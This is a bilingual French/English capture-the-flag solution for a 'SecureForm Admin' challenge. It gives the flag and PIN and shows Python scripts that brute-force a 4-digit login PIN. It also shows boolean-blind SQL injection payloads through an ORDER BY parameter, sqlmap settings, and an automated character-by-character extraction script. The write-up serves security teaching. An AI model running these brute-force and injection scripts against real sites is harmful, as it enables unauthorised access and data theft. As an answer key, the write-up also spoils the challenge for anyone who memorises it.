# Solution — SecureForm Admin

**Flag:** `FLAG{bl1nd_sqli_0rd3r_by}`

---

## Vue d'ensemble / Overview

Ce challenge se résout en deux étapes :
1. **Brute force du PIN** — contourner l'authentification
2. **Blind SQL Injection dans ORDER BY** — extraire le flag de la base de données

This challenge is solved in two steps:
1. **PIN brute force** — bypass authentication
2. **Blind SQL Injection in ORDER BY** — extract the flag from the database

---

## Étape 1 : Brute force du PIN / Step 1: PIN Brute Force

### Analyse

Le fichier `config.php` définit un PIN à 4 chiffres (`SECRET_PIN`). La page `index.php`
compare la saisie directement à cette constante, **sans aucune limitation de tentatives**
(pas de rate limiting, pas de CAPTCHA, pas de lockout).

`config.php` defines a 4-digit PIN (`SECRET_PIN`). The `index.php` page compares input
directly to this constant with **no attempt limiting** (no rate limiting, no CAPTCHA,
no lockout).

### Exploitation

Il suffit d'itérer de `0000` à `9999`. Avec un script Python :

Simply iterate from `0000` to `9999`. With a Python script:

```python
import requests

url = "http://<CHALLENGE_URL>/index.php"

for pin in range(10000):
    pin_str = str(pin).zfill(4)
    r = requests.post(url, data={"pin": pin_str}, allow_redirects=False)
    if r.status_code == 302 and "dashboard.php" in r.headers.get("Location", ""):
        print(f"[+] PIN found: {pin_str}")
        session_cookie = r.cookies.get("PHPSESSID")
        print(f"[+] PHPSESSID: {session_cookie}")
        break
```

Le PIN est `7392`. Notez le cookie `PHPSESSID` pour l'étape suivante.

The PIN is `7392`. Save the `PHPSESSID` cookie for the next step.

---

## Étape 2 : Blind SQL Injection ORDER BY / Step 2: Blind ORDER BY SQL Injection

### Analyse de la vulnérabilité

Dans `dashboard.php`, la requête est construite comme suit :

In `dashboard.php`, the query is built as follows:

```php
$order   = isset($_GET['order'])   ? sanitize_text_field($_GET['order'])   : 'DESC';
$orderby = isset($_GET['orderby']) ? sanitize_text_field($_GET['orderby']) : 'submission_time';

$query = sprintf(
    "SELECT * FROM %s WHERE language = :lang ORDER BY %s %s",
    $table_name, $orderby, $order
);
```

La fonction `sanitize_text_field()` imite celle de WordPress : elle supprime les balises HTML,
les null bytes, bloque `SLEEP(` et `BENCHMARK(`, mais **ne neutralise pas** les expressions SQL
arbitraires dans un contexte `ORDER BY`.

`sanitize_text_field()` mimics WordPress's function: it strips HTML tags, null bytes, blocks
`SLEEP(` and `BENCHMARK(`, but **does not neutralize** arbitrary SQL expressions in an
`ORDER BY` context.

### Pourquoi ORDER BY est spécial / Why ORDER BY is special

Contrairement à un `WHERE`, on ne peut pas utiliser `UNION` ni simplement injecter une
sous-requête inline. On exploite le comportement du tri :

Unlike a `WHERE` clause, you cannot use `UNION` or inject inline subqueries directly.
Instead, we exploit the sort behavior:

```sql
ORDER BY (CASE WHEN (<condition>) THEN id ELSE name END)
```

- Si la **condition est vraie** → tri par `id` (numérique : `1, 2, 3...`)
- Si la **condition est fausse** → tri par `name` (alphabétique : `AAA, ZZZ...`)

En créant deux entrées `ZZZ` (id=1) et `AAA` (id=2), l'ordre d'affichage trahit le
résultat booléen de la condition.

- If the **condition is true** → sort by `id` (numeric: `1, 2, 3...`)
- If the **condition is false** → sort by `name` (alphabetic: `AAA, ZZZ...`)

By creating two entries `ZZZ` (id=1) and `AAA` (id=2), the display order reveals
the boolean result of the condition.

### Préparation / Preparation

Se connecter avec le PIN trouvé, puis créer deux entrées dans cet ordre :
1. Nom : `ZZZ`
2. Nom : `AAA`

Log in with the found PIN, then create two entries in this order:
1. Name: `ZZZ`
2. Name: `AAA`

### Injection manuelle / Manual injection

Tester la condition avec un payload dans `orderby` :

Test a condition with a payload in `orderby`:

```
# Condition vraie (1=1) → ZZZ apparaît en premier
GET /dashboard.php?orderby=(CASE WHEN (1=1) THEN id ELSE name END)&order=ASC

# Condition fausse (1=2) → AAA apparaît en premier
GET /dashboard.php?orderby=(CASE WHEN (1=2) THEN id ELSE name END)&order=ASC
```

Extraire le flag caractère par caractère :

Extract the flag character by character:

```
# Tester si le premier char du flag est 'F'
GET /dashboard.php?orderby=(CASE WHEN (SUBSTRING((SELECT flag FROM secrets LIMIT 1),1,1)='F') THEN id ELSE name END)&order=ASC
```

### Exploitation automatisée avec sqlmap / Automated exploitation with sqlmap

Le script [`sqlmap_solve.sh`](sqlmap_solve.sh) automatise l'extraction complète.
Passer le `PHPSESSID` en argument :

The [`sqlmap_solve.sh`](sqlmap_solve.sh) script automates the full extraction.
Pass the `PHPSESSID` as argument:

```bash
bash solve/sqlmap_solve.sh <PHPSESSID>
```

**Paramètres clés de sqlmap :**

| Paramètre | Rôle |
|-----------|------|
| `-p orderby` | Cible le paramètre injectable |
| `--technique=B` | Boolean-based blind uniquement (time-based bloqué) |
| `--prefix="(CASE WHEN ("` | Ouvre le CASE WHEN |
| `--suffix=") THEN id ELSE name END)"` | Ferme la structure |
| `--string=">ZZZ<"` | Indicateur de condition vraie dans la réponse HTML |

### Script Python manuel / Manual Python script

```python
import requests
import string

BASE_URL = "http://<CHALLENGE_URL>/dashboard.php"
COOKIES  = {"PHPSESSID": "<YOUR_PHPSESSID>"}

def query_bool(condition: str) -> bool:
    """Returns True if condition is true (ZZZ appears first in response)."""
    payload = f"(CASE WHEN ({condition}) THEN id ELSE name END)"
    r = requests.get(BASE_URL, params={"orderby": payload, "order": "ASC"}, cookies=COOKIES)
    # ZZZ appears before AAA when condition is true (sort by id)
    return r.text.index(">ZZZ<") < r.text.index(">AAA<")

def extract_string(sql_expr: str) -> str:
    result = ""
    charset = string.printable
    for pos in range(1, 100):
        found = False
        for char in charset:
            condition = f"SUBSTRING(({sql_expr}),{pos},1)='{char}'"
            if query_bool(condition):
                result += char
                print(f"\r[+] {result}", end="", flush=True)
                found = True
                break
        if not found:
            break
    print()
    return result

flag = extract_string("SELECT flag FROM secrets LIMIT 1")
print(f"[+] Flag: {flag}")
```

---

## Résumé de l'exploitation / Exploitation Summary

```
1. Brute force PIN (0000-9999, sans rate limiting) → PIN: 7392
2. Créer 2 entrées: ZZZ (id=1), AAA (id=2)
3. Injection dans ?orderby=
   ORDER BY (CASE WHEN (<condition>) THEN id ELSE name END)
   → condition vraie  : ZZZ en premier (tri par id)
   → condition fausse : AAA en premier (tri par name)
4. Extraction booléenne caractère par caractère
   → SELECT flag FROM secrets LIMIT 1
   → FLAG{bl1nd_sqli_0rd3r_by}
```

---

## Références / References

- [PortSwigger - Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
- [PayloadsAllTheThings - SQL Injection ORDER BY](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
- [sqlmap documentation](https://sqlmap.org/)
